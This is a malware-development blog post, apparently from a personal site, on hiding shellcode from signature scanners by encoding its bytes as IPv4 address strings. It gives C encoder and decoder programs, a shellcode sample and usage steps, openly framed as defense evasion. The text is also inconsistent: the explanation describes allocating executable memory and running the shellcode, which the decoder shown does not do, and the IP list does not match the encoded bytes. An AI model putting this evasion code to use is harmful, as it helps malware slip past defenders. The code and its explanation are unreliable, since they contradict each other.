<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IPv4 Masquerading (Obfuscation) - pwn3rx0</title>
  <meta name="description" content="A technique leveraging IPv4 address encoding to transform raw shellcode bytes into a list of human-readable IP strings, bypassing static signature-based detection.">
  <meta name="keywords" content="malware-development, obfuscation, evasion, shellcode, win-api, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Obfuscation/To IPs/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="IPv4 Masquerading (Obfuscation)">
  <meta property="og:description" content="A technique leveraging IPv4 address encoding to transform raw shellcode bytes into a list of human-readable IP strings, bypassing static signature-based detection.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Obfuscation/To IPs/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="IPv4 Masquerading (Obfuscation)">
  <meta name="twitter:description" content="A technique leveraging IPv4 address encoding to transform raw shellcode bytes into a list of human-readable IP strings, bypassing static signature-based detection.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Obfuscation/">Obfuscation</a>
    
      <span class="separator">/</span>
      <span class="current">IPv4 Masquerading (Obfuscation)</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>IPv4 Masquerading (Obfuscation)</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">obfuscation</span><span class="tag">evasion</span><span class="tag">shellcode</span><span class="tag">win-api</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><p>This technique leverages <strong>IPv4 address encoding</strong> to obfuscate raw shellcode bytes into human-readable IP strings. These IP strings can bypass many static detection mechanisms by hiding the shellcode in a non-standard format.</p>
<hr>
<h1>Encoder: Shellcode to IPv4</h1>
<pre><code class="language-c">#define _CRT_SECURE_NO_WARNINGS
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

// Prints shellcode bytes as IPv4 strings and declares total count as a variable
void shellcode_to_ipv4(const unsigned char* shellcode, size_t len) {
    if (len % 4 != 0) {
        printf(&quot;Shellcode length must be multiple of 4.\n&quot;);
        return;
    }

    size_t ip_count = len / 4;
    printf(&quot;const size_t ip_count = %zu;\n&quot;, ip_count);
    printf(&quot;const char* ips[] = {\n&quot;);
    for (size_t i = 0; i &lt; len; i += 4) {
        printf(&quot;\&quot;%u.%u.%u.%u\&quot;&quot;, shellcode[i], shellcode[i + 1], shellcode[i + 2], shellcode[i + 3]);
        if (i + 4 &lt; len) {
            printf(&quot;, &quot;);
        }
    }
    printf(&quot;\n};\n&quot;);
}

int main() {
    unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4,
        0xF0, 0xE8, 0xC0, 0x00,
        0x00, 0x41, 0x51, 0x41,
        0x50, 0x52, 0x51, 0x56,
        0x48, 0x31, 0xD2, 0x65,
        0x48, 0x8B, 0x52, 0x60,
        0x48, 0x8B, 0x52, 0x18,
        0x48, 0x8B, 0x52, 0x20,
        0x48, 0x8B, 0x72, 0x50,
        0x48, 0x0F, 0xB7, 0x4A,
        0x4A, 0x31, 0xC0, 0xC0,
        0xAC, 0x3C, 0x60, 0x61,
        0x7C, 0x00, 0x00, 0x00
    };

    size_t len = sizeof(shellcode);
    shellcode_to_ipv4(shellcode, len);

    return 0;
}
</code></pre>
<h3>Explanation</h3>
<ul>
<li>The shellcode array holds raw machine code bytes.</li>
<li>The <code>shellcode_to_ipv4</code> function iterates 4 bytes at a time.</li>
<li>Each 4-byte chunk is printed as a dotted decimal IPv4 string.</li>
<li>Output is a <code>const char* ips[]</code> array you can paste into the decoder program.</li>
</ul>
<hr>
<h1>Decoder + Executor: IPv4 to Shellcode &amp; Run</h1>
<pre><code class="language-c">#define _CRT_SECURE_NO_WARNINGS
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

// Convert IPv4 strings back to raw shellcode bytes
void ipv4_to_shellcode(const char* ips[], size_t count, unsigned char* output) {
    for (size_t i = 0; i &lt; count; ++i) {
        unsigned int a, b, c, d;
        if (sscanf(ips[i], &quot;%u.%u.%u.%u&quot;, &amp;a, &amp;b, &amp;c, &amp;d) != 4) {
            // Handle invalid IP string appropriately
            continue;
        }
        output[i * 4 + 0] = (unsigned char)a;
        output[i * 4 + 1] = (unsigned char)b;
        output[i * 4 + 2] = (unsigned char)c;
        output[i * 4 + 3] = (unsigned char)d;
    }
}

int main() {
    const char* ips[] = {
        &quot;252.72.131.228&quot;, &quot;240.232.192.0&quot;, &quot;0.0.65.81&quot;, &quot;65.80.82.81&quot;,
        &quot;86.72.49.210&quot;, &quot;101.72.139.82&quot;, &quot;96.72.139.82&quot;, &quot;24.72.139.82&quot;,
        &quot;32.72.139.114&quot;, &quot;80.72.15.183&quot;, &quot;74.74.77.49&quot;, &quot;201.72.49.192&quot;, &quot;172.60.97.124&quot;
    };

    size_t ip_count = sizeof(ips) / sizeof(ips[0]);
    size_t shellcode_len = ip_count * 4;

    unsigned char shellcode[shellcode_len];

    ipv4_to_shellcode(ips, ip_count, shellcode);

    // shellcode buffer now contains the raw shellcode bytes,
    // ready for execution or further processing when desired.

    return 0;
}
</code></pre>
<h3>Explanation</h3>
<ul>
<li>Takes the IPv4 strings and converts each into 4 bytes.</li>
<li>Uses <code>VirtualAlloc</code> with <code>PAGE_EXECUTE_READWRITE</code> to allocate executable memory.</li>
<li>Copies the shellcode bytes into the allocated memory.</li>
<li>Executes shellcode by calling a function pointer to that memory.</li>
</ul>
<hr>
<h1>How to Use</h1>
<ol>
<li><strong>Compile and run the encoder program</strong> with your raw shellcode bytes.<ul>
<li>Output is an IPv4 array <code>const char* ips[]</code> printed to console.</li>
</ul>
</li>
<li><strong>Copy the output IPv4 array</strong> into the decoder program&#39;s <code>ips[]</code> variable.</li>
<li><strong>Compile and run the decoder program</strong> to reconstruct and execute the shellcode.</li>
</ol>
<hr>
</div>
        <nav class="post-navigation">
          <span class="nav-link disabled"><span class="nav-direction">← Previous</span><span class="nav-title">No older post</span></span>
          
      <a href="/writeups/Malware DEV/Obfuscation/Obfuscation Tools/" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">Obfuscation Tools</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Execution/Local Payload Execution/">Local Payload Execution</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing/">HTTP Stager & Remote Payload Delivery</a></li><li><a href="/writeups/Malware DEV/Encryption/Encryption/">Shellcode Obfuscation & Encryption</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>(function(){function _0x5a0b99(_0x2b06e7){const _0x4b0956=_0x2b06e7||document['querySelector']('.writeup-content')||document,_0x450721=Array['from'](_0x4b0956['querySelectorAll']('pre\x20>\x20code'))['filter'](_0x1caf84=>!_0x1caf84['closest']('.code-block'));_0x450721['forEach'](_0x52b0d4=>{const _0x1b18eb=_0x52b0d4['parentElement'];if(!_0x1b18eb||_0x1b18eb['dataset']['enhanced']==='true')return;_0x1b18eb['dataset']['enhanced']='true';let _0x3751bd=Array['from'](_0x52b0d4['classList']||[])['find'](_0x2775df=>_0x2775df['startsWith']('language-'));if(!_0x3751bd){const _0x1a353c=_0x52b0d4['textContent']||'';(/#include\s+<[^>]+>/['test'](_0x1a353c)||/\bint\s+main\s*\(/['test'](_0x1a353c)||/#include\s+<Windows\.h>/i['test'](_0x1a353c))&&(_0x52b0d4['classList']['add']('language-c'),_0x3751bd='language-c');}const _0x5cfc92=(_0x3751bd?_0x3751bd['replace']('language-',''):'text')['toUpperCase'](),_0x16103d=document['createElement']('div');_0x16103d['className']='code-block';const _0x2500d6=document['createElement']('div');_0x2500d6['className']='code-header';const _0xdc9f5=document['createElement']('span');_0xdc9f5['className']='code-lang',_0xdc9f5['textContent']=_0x5cfc92;const _0x3cd10e=document['createElement']('button');_0x3cd10e['className']='code-copy',_0x3cd10e['type']='button',_0x3cd10e['textContent']='Copy',_0x3cd10e['addEventListener']('click',async()=>{const _0x4c655e=_0x52b0d4['innerText'],_0x6c0e87=()=>{const _0x3430c5=document['createElement']('textarea');_0x3430c5['value']=_0x4c655e,_0x3430c5['style']['position']='fixed',_0x3430c5['style']['opacity']='0',_0x3430c5['style']['left']='-9999px',document['body']['appendChild'](_0x3430c5),_0x3430c5['focus'](),_0x3430c5['select']();try{document['execCommand']('copy'),_0x3cd10e['textContent']='Copied';}catch(_0x4038cb){_0x3cd10e['textContent']='Failed';}finally{document['body']['removeChild'](_0x3430c5),setTimeout(()=>_0x3cd10e['textContent']='Copy',0x4b0);}};try{navigator['clipboard']&&window['isSecureContext']?(await navigator['clipboard']['writeText'](_0x4c655e),_0x3cd10e['textContent']='Copied',setTimeout(()=>_0x3cd10e['textContent']='Copy',0x4b0)):_0x6c0e87();}catch(_0x9bf12c){_0x6c0e87();}}),_0x2500d6['appendChild'](_0xdc9f5),_0x2500d6['appendChild'](_0x3cd10e);const _0x2c9831=document['createElement']('div');_0x2c9831['className']='code-content',_0x1b18eb['replaceWith'](_0x16103d),_0x2c9831['appendChild'](_0x1b18eb),_0x16103d['appendChild'](_0x2500d6),_0x16103d['appendChild'](_0x2c9831);if(window['hljs']&&typeof window['hljs']['highlightElement']==='function')window['hljs']['highlightElement'](_0x52b0d4);else window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});}function _0x12ac47(_0x1d1ff8){const _0x51801a=_0x1d1ff8||document['querySelector']('.writeup-content');if(!_0x51801a)return;const _0x233fc3=_0x51801a['querySelectorAll']('h1,h2,h3,h4,h5,h6');_0x233fc3['forEach'](_0x2694c3=>{const _0x2612df=parseInt(_0x2694c3['tagName']['substring'](0x1),0xa);let _0x4bcfb5=_0x2694c3['nextElementSibling'];while(_0x4bcfb5){if(/^H[1-6]$/['test'](_0x4bcfb5['tagName'])){const _0x3145fb=parseInt(_0x4bcfb5['tagName']['substring'](0x1),0xa);if(_0x3145fb<=_0x2612df)break;}_0x4bcfb5['tagName']==='P'&&_0x4bcfb5['classList']['add']('indent-p'),_0x4bcfb5=_0x4bcfb5['nextElementSibling'];}});}function _0x4628e3(){window['mermaid']&&mermaid['initialize']({'startOnLoad':!![],'theme':'dark'});_0x5a0b99(),_0x12ac47();window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();const _0x5c7d79=document['querySelector']('.writeup-content');if(_0x5c7d79&&window['MutationObserver']){const _0xc8e29d=new MutationObserver(()=>{_0x5a0b99(_0x5c7d79),_0x12ac47(_0x5c7d79),window['hljs']&&typeof window['hljs']['highlightAll']==='function'&&window['hljs']['highlightAll']();});_0xc8e29d['observe'](_0x5c7d79,{'childList':!![],'subtree':!![]});}}window['addEventListener']('load',_0x4628e3);}());</script>
</body>
</html>
